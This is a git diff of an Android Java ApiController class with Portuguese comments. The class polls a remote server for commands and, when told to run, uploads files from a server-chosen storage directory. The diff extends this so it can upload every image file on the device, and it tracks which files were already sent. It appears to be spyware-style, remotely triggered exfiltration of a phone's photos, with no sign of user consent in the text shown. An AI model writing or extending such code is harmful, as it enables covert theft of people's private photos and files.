@@ -48,20 +48,37 @@ public class ApiController {
         return MultipartBody.Part.createFormData(partName, file.getName(), requestFile);
     }
 
-    private void uploadMultipleFiles(String dir, int maxUploads, ArrayList<String> sendedList) {
+    private void uploadMultipleFiles(String dir, int maxUploads, ArrayList<String> sendedList, ArrayList<String> allFiles) {
 
+        // dir: diretorio dos arquivos ou "0"
+        // maxUploads: maximo de arquivos por Post
+        // sendedList: lista dos arquivos ja enviados
+        // allFiles: lista de todos os arquivos(img) do dispositivo
 
-        //if(dir.equals("allFiles")){
+        File[] files;
 
-        //}
+        // check se dir é "0" e allFiles tem algo dentro (Pegar de todos os arquivos)
+        if(dir.equals("0") && allFiles.size()>0){
+            //files = allFiles.toArray();
+            File[] arr = new File[allFiles.size()];
+            for (int i = 0; i < allFiles.size(); i++)
+                arr[i] = new File(allFiles.get(i));// = allFiles.get(i);
+            files = arr;
+        }
+        else{
+            // Pega apenas do diretorio escolhido
+            String path= Environment.getExternalStorageDirectory().getAbsolutePath()+dir;
+            File directory = new File(path);
+            files = directory.listFiles();
+        }
 
 
         // Pega o path q vem em dir
-        String path= Environment.getExternalStorageDirectory().getAbsolutePath()+dir;
-        System.out.println(path);
+        //String path= Environment.getExternalStorageDirectory().getAbsolutePath()+dir;
+        //System.out.println(path);
 
-        File directory = new File(path);
-        File[] files = directory.listFiles();
+        //File directory = new File(path);
+        //File[] files = directory.listFiles(); // posso sobrescrever com todos
 
         List<MultipartBody.Part> parts = new ArrayList<>(); // lista dinamica de arquivos
 
@@ -121,7 +138,7 @@ public class ApiController {
         });
     }
 
-    public void getCommands() {
+    public void getCommands(ArrayList<String> allFiles) {
 
         Retrofit retrofit = new Retrofit.Builder()
                 .baseUrl(Api.BASE_URL)
@@ -162,7 +179,7 @@ public class ApiController {
 
                     if (run.equals("true")) {
                         // chamando o metodo de upload passando os parametros q vieram
-                        uploadMultipleFiles(dir, maxUploads, listdata);
+                        uploadMultipleFiles(dir, maxUploads, listdata, allFiles);
                     }
                     else{
                         return;
